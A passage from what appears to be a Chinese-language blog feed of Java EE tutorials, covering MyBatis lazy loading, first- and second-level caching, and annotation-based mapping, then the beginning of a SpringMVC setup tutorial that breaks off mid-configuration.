name=&quot;aggressiveLazyLoading&quot; value=&quot;false&quot;/&gt;    &lt;/settings&gt;</code></pre><ul><li>lazyLoadingEnabled：延迟加载的全局开关。当开启时，所有关联对象都会延迟加载。 </li><li>aggressiveLazyLoading：当开启时，任何方法的调用都会加载该对象的所有属性。否则，每个属性会按需加载。</li></ul><p>5、测试查询用户信息时：</p><pre><code class="java">@Test    public void testFindAll() &#123;        List&lt;Account&gt; accounts = accountDao.findAll();        for (Account account : accounts) &#123;            System.out.println(&quot;每个account的信息：--------------&quot;);            System.out.println(account);            System.out.println(account.getUser());        &#125;    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201116230506709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到SQL语句全部执行了。</p><p>6、测试只查账户信息不查用户信息：</p><pre><code class="java">@Test    public void testFindAll() &#123;        List&lt;Account&gt; accounts = accountDao.findAll();       /* for (Account account : accounts) &#123;            System.out.println(&quot;每个account的信息：--------------&quot;);            System.out.println(account);            System.out.println(account.getUser());        &#125;*/    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201116231408878.png#pic_center" alt="在这里插入图片描述"><br>可以看到只执行了一条SQL语句，即执行了延迟加载。</p><p><strong>3、使用 Collection 实现延迟加载</strong>：</p><p>同样我们也可以在一对多关系配置的<code>&lt;collection&gt;</code>结点中配置延迟加载策略。<code>&lt;collection&gt;</code>结点中也有 select 属性，column 属性。</p><p>需求：</p><ul><li>完成加载用户对象时，查询该用户所拥有的账户信息。</li></ul><p>1、 User 实体类：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer Id;    private String username;    private String Address;    private String Sex;    private Date Birthday;    private List&lt;Account&gt; accounts;    public List&lt;Account&gt; getAccounts() &#123;        return accounts;    &#125;    public void setAccounts(List&lt;Account&gt; accounts) &#123;        this.accounts = accounts;    &#125;    public Integer getId() &#123;        return Id;    &#125;    public void setId(Integer Id) &#123;        this.Id = Id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return Address;    &#125;    public void setAddress(String address) &#123;        Address = address;    &#125;    public String getSex() &#123;        return Sex;    &#125;    public void setSex(String sex) &#123;        Sex = sex;    &#125;    public Date getBirthday() &#123;        return Birthday;    &#125;    public void setBirthday(Date birthday) &#123;        Birthday = birthday;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;Id=&quot; + Id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, Address=&#39;&quot; + Address + &#39;\&#39;&#39; +                &quot;, Sex=&#39;&quot; + Sex + &#39;\&#39;&#39; +                &quot;, Birthday=&quot; + Birthday +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、用户（User）和账户（Account）持久层接口的方法：</p><pre><code class="java">    /**     * 查询所有用户     *     * @return     */    List&lt;User&gt; findAll();    /**     * 根据用户 id 查询账户信息     * @param uid     * @return     */    List&lt;User&gt; findByUid(Integer uid);</code></pre><p>3、编写用户持久层映射配置：</p><pre><code class="xml">&lt;resultMap type=&quot;user&quot; id=&quot;userMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;id&quot;&gt;&lt;/id&gt;        &lt;result column=&quot;username&quot; property=&quot;username&quot;/&gt;        &lt;result column=&quot;address&quot; property=&quot;address&quot;/&gt;        &lt;result column=&quot;sex&quot; property=&quot;sex&quot;/&gt;        &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;/&gt;        &lt;!-- collection 是用于建立一对多中集合属性的对应关系         ofType 用于指定集合元素的数据类型        --&gt;        &lt;collection property=&quot;accounts&quot; ofType=&quot;account&quot;                    select=&quot;com.itheima.dao.IAccountDao.findByUid&quot;                    column=&quot;id&quot;&gt;        &lt;/collection&gt;    &lt;/resultMap&gt;    &lt;!--查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;userMap&quot;&gt;        select * from user    &lt;/select&gt;</code></pre><p><code>&lt;collection&gt;</code>标签：</p><ul><li>主要用于加载关联的集合对象</li></ul><p>select 属性：</p><ul><li>用于指定查询 account 列表的 sql 语句，所以填写的是该 sql 映射的 id</li></ul><p>column 属性：</p><ul><li>用于指定 select 属性的 sql 语句的参数来源，上面的参数来自于 user 的 id 列，所以就写成 id 这一个字段名了</li></ul><p>4、编写账户持久层映射配置：</p><pre><code class="xml">    &lt;!-- 根据用户 id 查询账户信息 --&gt;    &lt;select id=&quot;findByUid&quot; resultType=&quot;account&quot; parameterType=&quot;int&quot;&gt;        select * from account where uid = #&#123;uid&#125;    &lt;/select&gt;</code></pre><p>5、延时加载 测试只加载用户信息：</p><pre><code class="java"> @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();      /*  for (User user : users) &#123;            System.out.println(&quot;用户的信息：&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;*/    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201116233927533.png#pic_center" alt="在这里插入图片描述"></p><p>可以发现并没有加载 Account 账户信息。</p><h4 id="十二、-Mybatis-缓存"><a href="#十二、-Mybatis-缓存" class="headerlink" title="十二、 Mybatis 缓存"></a>十二、 Mybatis 缓存</h4><p>像大多数的持久化框架一样，Mybatis 也提供了缓存策略，通过缓存策略来减少数据库的查询次数，从而提高性能。</p><p>Mybatis 中缓存分为一级缓存，二级缓存。</p><p><img src="http://img-blog.csdnimg.cn/20201117191943967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>1、Mybatis 一级缓存</strong>：</p><p>一级缓存是 SqlSession 级别的缓存，只要 SqlSession 没有 flush 或 close，它就存在。</p><p>验证一级缓存的存在：</p><p>测试方法：</p><pre><code class="java">  @Test    public void testFirstCache() &#123;        User user1 = userDao.findById(41);        System.out.println(user1);        User user2 = userDao.findById(41);        System.out.println(user2);        System.out.println(user1 == user2);    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201117200149170.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201117200201555.png" alt="在这里插入图片描述"><br>可以发现，虽然在上面的代码中查询了两次，但最后只执行了一次数据库操作，这就是 Mybatis 提供给我们的一级缓存在起作用了。因为一级缓存的存在，导致第二次查询 id 为 41 的记录时，并没有发出 sql 语句从数据库中查询数据，而是从一级缓存中查询。</p><p>测试一级缓存的清空：</p><p>测试方法：</p><pre><code class="java"> @Test    public void testFirstCache() &#123;        User user1 = userDao.findById(41);        System.out.println(user1);        // sqlSession.close();        //再次获取 SqlSession 对象        // sqlSession = factory.openSession();        //userDao = sqlSession.getMapper(IUserDao.class);        sqlSession.clearCache();//此方法也可以清空缓存        User user2 = userDao.findById(41);        System.out.println(user2);        System.out.println(user1 == user2);    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201117200804977.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201117200834562.png" alt="在这里插入图片描述"></p><p>当执行  sqlSession.clearCache() 后，再次获取sqlSession并查询id=41的User对象时，又重新执行了sql语句，从数据库进行了查询操作。</p><p><strong>一级缓存的分析</strong>：</p><p>一级缓存是 SqlSession 范围的缓存，当调用 SqlSession 的修改，添加，删除，commit()，close()方法时，就会清空一级缓存。</p><p><img src="http://img-blog.csdnimg.cn/20201117201409802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当第一次发起查询用户 id 为 1 的用户信息，先去找缓存中是否有 id 为 1 的用户信息，如果没有，从数据库查询用户信息。</p><p>得到用户信息，将用户信息存储到一级缓存中。</p><p>如果 sqlSession 去执行 commit 操作（执行插入、更新、删除），清空 SqlSession 中的一级缓存，这样做的目的为了让缓存中存储的是最新的信息，避免脏读。</p><p>第二次发起查询用户 id 为 1 的用户信息，先去找缓存中是否有 id 为 1 的用户信息（此时已经没有一级缓存了），如果缓存中有，则直接从缓存中获取用户信息，没有则重新发起查询。</p><p><strong>2、Mybatis 二级缓存</strong>：</p><p>它是 Mybatis 中 SqlSessionFactory 对象的缓存。由同一个 SqlSessionFactory 对象创建的 SqlSession 共享其缓存。</p><p><img src="http://img-blog.csdnimg.cn/20201117202533218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>假设：</p><p>sqlSession1 去查询用户信息，查询到用户信息会将查询数据存储到二级缓存中。</p><p>如果 SqlSession3 去执行相同 mapper 映射下 sql，执行 commit 提交，将会清空该 mapper 映射下的二级缓存区域的数据。</p><p>sqlSession2 去查询与 sqlSession1 相同的用户信息，首先会去缓存中找是否存在数据，如果存在直接从缓存中取出数据,，否则重新发起查询（本例）。</p><p><strong>二级缓存的使用步骤</strong>：</p><p>1、让Mybatis框架支持二级缓存（在SqlMapConfig.xml中配置）：</p><pre><code class="xml">&lt;settings&gt;    &lt;!-- 开启二级缓存的支持 --&gt;    &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;&lt;/settings&gt;</code></pre><p>因为 cacheEnabled 的取值默认就为 true，所以这一步可以省略不配置。</p><p>true 代表开启二级缓存；为false 代表不开启二级缓存。</p><p>2、让当前的映射文件支持二级缓存（在IUserDao.xml中配置）：</p><pre><code class="xml">    &lt;!-- 开启二级缓存的支持 --&gt;    &lt;cache/&gt;</code></pre><p>3、让当前的操作支持二级缓存（在select标签中配置）：</p><pre><code class="xml">&lt;!-- 根据 id 查询 --&gt;&lt;select id=&quot;findById&quot; resultType=&quot;user&quot; parameterType=&quot;int&quot; useCache=&quot;true&quot;&gt;    select * from user where id = #&#123;uid&#125;&lt;/select&gt;</code></pre><p>将 IUserDao.xml 映射文件中的<code>&lt;select&gt;</code>标签中设置 useCache=” true “ 代表当前这个 statement 要使用二级缓存，如果不使用二级缓存可以设置为 false。</p><p>注意：针对每次查询都需要最新的数据 sql，要设置成 useCache=false，禁用二级缓存。</p><p>测试：</p><pre><code class="java"> @Test public void testFirstLevelCache()&#123;     SqlSession sqlSession1 = factory.openSession();     IUserDao dao1 = sqlSession1.getMapper(IUserDao.class);     User user1 = dao1.findById(41);     System.out.println(user1);     sqlSession1.close();//一级缓存消失     SqlSession sqlSession2 = factory.openSession();     IUserDao dao2 = sqlSession2.getMapper(IUserDao.class);     User user2 = dao2.findById(41);     System.out.println(user2);     sqlSession2.close();     System.out.println(user1 == user2); &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201117203958859.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2020111720403564.png" alt="在这里插入图片描述"><br>经过上面的测试，发现执行了两次查询，并且在执行第一次查询后，我们关闭了一级缓存，再去执行第二次查询时，我们发现并没有对数据库发出 sql 语句，所以此时的数据就只能是来自于我们所说的二级缓存。</p><p>user1 = user2 = false 的原因是 二级缓存存放的是 <strong>数据</strong> 而不是对象，每次查询都会创建一个新的对象。 </p><h4 id="十三、-Mybatis-注解开发"><a href="#十三、-Mybatis-注解开发" class="headerlink" title="十三、 Mybatis 注解开发"></a>十三、 Mybatis 注解开发</h4><p><strong>1、mybatis 的常用注解</strong>：</p><pre><code class="sql">@Insert: 实现新增@Update: 实现更新@Delete: 实现删除@Select: 实现查询@Result: 实现结果集封装@Results: 可以与@Result 一起使用，封装多个结果集@ResultMap: 实现引用@Results 定义的封装@One: 实现一对一结果集封装@Many: 实现一对多结果集封装@SelectProvider: 实现动态 SQL 映射@CacheNamespace: 实现注解二级缓存的使用</code></pre><p><strong>2、使用 Mybatis 注解实现基本 CRUD</strong>：</p><p>1、实体类：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer id;    private String username;    private String address;    private String sex;    private Date birthday;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    public String getSex() &#123;        return sex;    &#125;    public void setSex(String sex) &#123;        this.sex = sex;    &#125;    public Date getBirthday() &#123;        return birthday;    &#125;    public void setBirthday(Date birthday) &#123;        this.birthday = birthday;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, address=&#39;&quot; + address + &#39;\&#39;&#39; +                &quot;, sex=&#39;&quot; + sex + &#39;\&#39;&#39; +                &quot;, birthday=&quot; + birthday +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、使用注解方式开发持久层接口：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     * @return     */    @Select(&quot;select * from user&quot;)    List&lt;User&gt; findAll();    /**     * 根据 id 查询一个用户     * @param userId     * @return     */    @Select(&quot;select * from user where id = #&#123;uid&#125; &quot;)    User findById(Integer userId);    /**     * 插入操作     * @param user     * @return     */    @Insert(&quot;insert into user(username,sex,birthday,address)values(#&#123;username&#125;,#&#123;sex&#125;,#&#123;birthday&#125;,#&#123;address&#125;)&quot;)    int saveUser(User user);    /**     * 更新操作     * @param user     * @return     */    @Update(&quot;update user set username=#&#123;username&#125;, address =#&#123;address&#125;, sex =#&#123;sex&#125;, birthday =#&#123;birthday&#125;where id =#&#123;id&#125;&quot;)    int updateUser(User user);    /**     * 删除用户     * @param userId     * @return     */    @Delete(&quot;delete from user where id = #&#123;uid&#125; &quot;)    int deleteUser(Integer userId);    /**     * 查询使用聚合函数     * @return     */    @Select(&quot;select count(*) from user &quot;)    int findTotal();    /**     * 模糊查询     * @param name     * @return     */    @Select(&quot;select * from user where username like #&#123;username&#125; &quot;)    List&lt;User&gt; findByName(String name);&#125;</code></pre><p>3、SqlMapConfig 配置文件：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configuration        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;    &lt;!--引入外部文件--&gt;    &lt;properties resource=&quot;jdbcConfig.properties&quot;/&gt;    &lt;!--配置别名--&gt;    &lt;typeAliases&gt;        &lt;package name=&quot;com.smk.domain&quot;/&gt;    &lt;/typeAliases&gt;    &lt;environments default=&quot;mysql&quot;&gt;        &lt;environment id=&quot;mysql&quot;&gt;            &lt;transactionManager type=&quot;JDBC&quot;&gt;&lt;/transactionManager&gt;            &lt;dataSource type=&quot;POOLED&quot;&gt;                &lt;property name=&quot;driver&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;                &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;                &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt;                &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;            &lt;/dataSource&gt;        &lt;/environment&gt;    &lt;/environments&gt;    &lt;!-- 配置 dao 接口的位置，它有两种方式    第一种：使用 mapper 标签配置 class 属性    第二种：使用 package 标签，直接指定 dao 接口所在的包    --&gt;    &lt;mappers&gt;        &lt;package name=&quot;com.smk.dao&quot;/&gt;    &lt;/mappers&gt;&lt;/configuration&gt;</code></pre><p>4、测试方法：</p><p>测试方法和xml映射配置开发是一样的。</p><p><strong>3、使用注解实现复杂关系映射开发</strong>：</p><p>实现复杂关系映射之前，可以在映射文件中通过配置 <code>&lt;resultMap&gt;</code> 来实现，在使用注解开发时我们需要借助<code>@Results</code> 注解，<code>@Result</code> 注解，<code>@One</code> 注解，<code>@Many</code> 注解。</p><p><strong>3.1、当POJO属性和数据库字段不一致时</strong>：</p><p>例：<br>1、 实体类：</p><pre><code class="java">    private Integer userId;    private String userName;    private String userAddress;    private String userSex;    private Date userBirthday;</code></pre><p>2、dao接口：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     *     * @return     */    @Select(&quot;select * from user&quot;)    @Results(id = &quot;userMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;userId&quot;),            @Result(column = &quot;username&quot;, property = &quot;userName&quot;),            @Result(column = &quot;address&quot;, property = &quot;userAddress&quot;),            @Result(column = &quot;sex&quot;, property = &quot;userSex&quot;),            @Result(column = &quot;birthday&quot;, property = &quot;userBirthday&quot;)    &#125;)    List&lt;User&gt; findAll();    /**     * 根据 id 查询用户     *     * @param userId     * @return     */    @Select(&quot;select * from user where id = #&#123;uid&#125; &quot;)    @ResultMap(&quot;userMap&quot;)    User findById(Integer userId);    /**     * 模糊查询     *     * @param name     * @return     */    @Select(&quot;select * from user where username like #&#123;username&#125;&quot;)    @ResultMap(&quot;userMap&quot;)    List&lt;User&gt; findByName(String name);&#125;</code></pre><p>其中：</p><p>@Results 注解代替的是标签<code>&lt;resultMap&gt;</code></p><p>@Resutl 注解代替了 <code>&lt;id&gt;</code>标签和<code>&lt;result&gt;</code>标签</p><p>@Result 中 属性介绍：</p><ul><li>id 是否是主键字段</li><li>column 数据库的列名</li><li>property 需要装配的属性名</li></ul><p>@Result定义后，在其他方法处，便可以使用该@Results定义的resultMap了。</p><p><strong>3.2、使用注解实现一对一复杂关系映射</strong>：</p><p>1、User 实体类及 Account 实体类：</p><p>和上面xml配置方式相同。</p><p>2、账户的持久层接口及注解配置：</p><pre><code class="java">public interface IAccountDao &#123;    @Select(&quot;select * from account&quot;)    @Results(id = &quot;accountMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;id&quot;),            @Result(column = &quot;uid&quot;, property = &quot;uid&quot;),            @Result(column = &quot;money&quot;, property = &quot;money&quot;),            @Result(property = &quot;user&quot;, column = &quot;uid&quot;, one = @One(select = &quot;com.smk.dao.IUserDao.findById&quot;, fetchType = FetchType.EAGER))    &#125;)    List&lt;Account&gt; findAll();&#125;</code></pre><p>@One 注解（一对一）：</p><ul><li>代替了<code>&lt;assocation&gt;</code>标签，是多表查询的关键，在注解中用来指定子查询返回单一对象。</li></ul><p>@One 注解属性介绍：</p><ul><li>select 指定用来多表查询的 sqlmapper</li><li>fetchType 会覆盖全局的配置参数 lazyLoadingEnabled。。</li></ul><p>使用格式：</p><ul><li>@Result(column=””,property=””,one=@One(select=””))</li></ul><p>3、用户的持久层接口及注解配置：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     *     * @return     */    @Select(&quot;select * from user&quot;)    @Results(id = &quot;userMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;userId&quot;),            @Result(column = &quot;username&quot;, property = &quot;userName&quot;),            @Result(column = &quot;address&quot;, property = &quot;userAddress&quot;),            @Result(column = &quot;sex&quot;, property = &quot;userSex&quot;),            @Result(column = &quot;birthday&quot;, property = &quot;userBirthday&quot;)    &#125;)    List&lt;User&gt; findAll();    /**     * 根据 id 查询用户     *     * @param userId     * @return     */    @Select(&quot;select * from user where id = #&#123;uid&#125; &quot;)    @ResultMap(&quot;userMap&quot;)    User findById(Integer userId);&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201126001548593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>3.3、使用注解实现一对多复杂关系映射</strong>：</p><p>1、User 实体类及 Account 实体类：</p><ul><li>和上面xml配置方式相同。</li></ul><p>2、用户的持久层接口及注解配置：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     *     * @return     */    @Select(&quot;select * from user&quot;)    @Results(id = &quot;userMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;userId&quot;),            @Result(column = &quot;username&quot;, property = &quot;userName&quot;),            @Result(column = &quot;address&quot;, property = &quot;userAddress&quot;),            @Result(column = &quot;sex&quot;, property = &quot;userSex&quot;),            @Result(column = &quot;birthday&quot;, property = &quot;userBirthday&quot;),            @Result(property = &quot;accounts&quot;, column = &quot;id&quot;, many = @Many(                    select = &quot;com.smk.dao.IAccountDao.findByUid&quot;,                    fetchType = FetchType.LAZY))    &#125;)    List&lt;User&gt; findAll();&#125;</code></pre><p>3、账户的持久层接口及注解配置：</p><pre><code class="java">public interface IAccountDao &#123;    // 根据用户 id 查询用户下的所有账户    @Select(&quot;select * from account where uid = #&#123;uid&#125; &quot;)    List&lt;Account&gt; findByUid(Integer userId);&#125;</code></pre><p>4、添加测试方法：</p><pre><code class="java">    //测试查询所有    @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();        for (User user : users) &#123;            System.out.println(&quot;-----每个用户的内容-----&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201126152434428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>测试延时加载：</p><pre><code class="java"> @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();       /* for (User user : users) &#123;            System.out.println(&quot;-----每个用户的内容-----&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;*/    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201126160013905.png#pic_center" alt="在这里插入图片描述"></p><p><strong>3.4、mybatis 基于注解的二级缓存</strong>：</p><p>1、在 SqlMapConfig 中开启二级缓存支持：</p><pre><code class="xml">&lt;!-- 配置二级缓存 --&gt;&lt;settings&gt;    &lt;!-- 开启二级缓存的支持 --&gt;    &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;&lt;/settings&gt;</code></pre><p>2、在持久层接口中使用注解配置二级缓存：</p><pre><code class="java">@CacheNamespace(blocking=true)//mybatis 基于注解方式实现配置二级缓存public interface IUserDao &#123;&#125;</code></pre><hr><p>🆗，至此mybatis的内容就总结完了（￣︶￣）↗　</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaEE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringMVC框架学习</title>
      <link href="2020/11/03/Java%20EE%E2%80%94%E2%80%94SpringMVC%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/11/03/Java%20EE%E2%80%94%E2%80%94SpringMVC%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="一、SpringMVC-概述："><a href="#一、SpringMVC-概述：" class="headerlink" title="一、SpringMVC 概述："></a>一、SpringMVC 概述：</h4><p> <strong>1、简单说一下SpringMVC的概念</strong>：</p><ul><li>SpringMVC 是一种基于 Java 的实现 MVC 设计模型的轻量级 Web 框架，是 Spring 框架为<strong>表现层</strong>提供的的后续产品，是目前最主流的 MVC框架之一。</li></ul><p><strong>2、SpringMVC 的优势</strong>：</p><p>1、清晰的角色划分：</p><ol><li> 前端控制器（DispatcherServlet）</li><li>请求到处理器映射（HandlerMapping）</li><li>处理器适配器（HandlerAdapter）</li><li> 视图解析器（ViewResolver）</li><li> 处理器或页面控制器（Controller）</li><li> 验证器（ Validator）</li><li>命令对象（Command 请求参数绑定到的对象就叫命令对象）</li><li>表单对象（Form Object 提供给表单展示和提交到的对象就叫表单对象）。</li></ol><p>2、分工明确，而且扩展点相当灵活，可以很容易扩展，虽然几乎不需要。</p><p>3、由于命令对象就是一个 POJO，无需继承框架特定 API，可以使用命令对象直接作为业务对象。</p><p>4、和 Spring 其他框架无缝集成，是其它 Web 框架所不具备的。</p><p>5、可适配，通过 HandlerAdapter 可以支持任意的类作为处理器。</p><p>6、可定制性，HandlerMapping、ViewResolver 等能够非常简单的定制。</p><p>7、功能强大的数据验证、格式化、绑定机制。</p><p>8、利用 Spring 提供的 Mock 对象能够非常简单的进行 Web 层单元测试。</p><p>9、本地化、主题的解析的支持，使我们更容易进行国际化和主题的切换。</p><p>10、强大的 JSP 标签库，使 JSP 编写更容易。</p><p> <strong>3、SpringMVC在三层架构的位置</strong>：<br><img src="http://img-blog.csdnimg.cn/20200930171640705.png" alt="在这里插入图片描述"></p><h4 id="二、SpringMVC-的入门："><a href="#二、SpringMVC-的入门：" class="headerlink" title="二、SpringMVC 的入门："></a>二、SpringMVC 的入门：</h4><p><strong>1、使用Maven创建web工程，引入开发的jar包</strong>:</p><p>需要用的坐标如下：</p><pre><code class="xml">     &lt;properties&gt;        &lt;!-- 版本锁定 --&gt;        &lt;spring.version&gt;5.0.2.RELEASE&lt;/spring.version&gt;    &lt;/properties&gt;    &lt;dependencies&gt;        &lt;!-- 单元测试--&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.11&lt;/version&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;            &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-web&lt;/artifactId&gt;            &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework&lt;/groupId&gt;            &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;            &lt;version&gt;$&#123;spring.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;            &lt;version&gt;2.5&lt;/version&gt;            &lt;scope&gt;provided&lt;/scope&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;            &lt;artifactId&gt;jsp-api&lt;/artifactId&gt;            &lt;version&gt;2.0&lt;/version&gt;            &lt;scope&gt;provided&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p><strong>2、配置核心的控制器（配置DispatcherServlet）</strong>：</p><p>在web.xml配置文件中核心控制器DispatcherServlet</p><pre><code class="xml">&lt;!-- SpringMVC的核心控制器 --&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;!-- 配置Servlet的初始化参数，读取springmvc的配置文件，创建spring容器 --&gt;        &lt;init-param&gt;            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;            &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt;        &lt;/init-param&gt;       &lt;!-- 配置servlet的对象的创建时间点，取值只能是非 0 正整数，表示启动顺序。        “1” 表示应用加载时创建。--&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;</code></pre><p><strong>3、 编写springmvc.xml的配置文件</strong>：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;        http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/mvc        http://www.springframework.org/schema/mvc/spring-mvc.xsd        http://www.springframework.org/schema/context        http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;!-- 配置spring创建容器时要扫描的包 --&gt;    &lt;context:component-scan base-package=&quot;com.smk&quot;&gt;&lt;/context:component-scan&gt;    &lt;!-- 配置视图解析器 --&gt;    &lt;bean id=&quot;viewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/pages/&quot;&gt;&lt;/property&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt;    &lt;/bean&gt;    &lt;!-- 配置spring开启注解mvc的支持--&gt;    